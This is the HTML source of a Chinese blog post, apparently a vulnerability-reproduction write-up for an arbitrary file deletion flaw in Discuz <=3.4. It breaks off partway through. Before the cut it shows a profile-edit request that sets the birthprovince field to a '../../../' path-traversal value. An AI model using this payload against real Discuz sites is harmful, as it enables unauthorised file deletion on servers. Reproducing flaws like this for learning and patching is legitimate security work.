@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>Discuz＜=3.4任意文件删除漏洞 · AlickLin&#39;s Blog.</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin="">
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin="">
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">AlickLin&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Discuz＜=3.4任意文件删除漏洞</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">AlickLin's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/avatar/dragonball.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Discuz＜=3.4任意文件删除漏洞
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">547</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2017/11/22</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><ul>
+<li>简介：该漏洞是在某一公众号上看到的，由于还是个萌新，所以想着复现一下加深印象，然后后期再看看大佬们的漏洞分析，复现需要环境，正好手头有一个discuz!x3.2的站，便拿来做个试验。</li>
+</ul>
+<ol>
+<li>注册账号</li>
+<li>post修改出生地</li>
+<li>构造表单</li>
+<li>总结</li>
+<li>修复方案</li>
+</ol>
+<h2 id="01-注册账号"><a href="#01-注册账号" class="headerlink" title="01 注册账号"></a>01 注册账号</h2><ul>
+<li>这个漏洞的利用先决条件是已有用户，所以需要在站点上注册个用户先。</li>
+</ul>
+<h2 id="02-post修改出生地"><a href="#02-post修改出生地" class="headerlink" title="02 post修改出生地"></a>02 post修改出生地</h2><ul>
+<li><p>代码如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#url</span><br><span class="line">/home.php?mod=spacecp&amp;ac=profile&amp;op=base</span><br><span class="line">#post data</span><br><span class="line">birthprovince=../../../test.txt&amp;profilesubmit=1&amp;formhash=b644603b</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>请求执行后，出生地将被修改如图(图片有误)：<br><img src="data:image/png;base64,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" alt="avatar"></p>
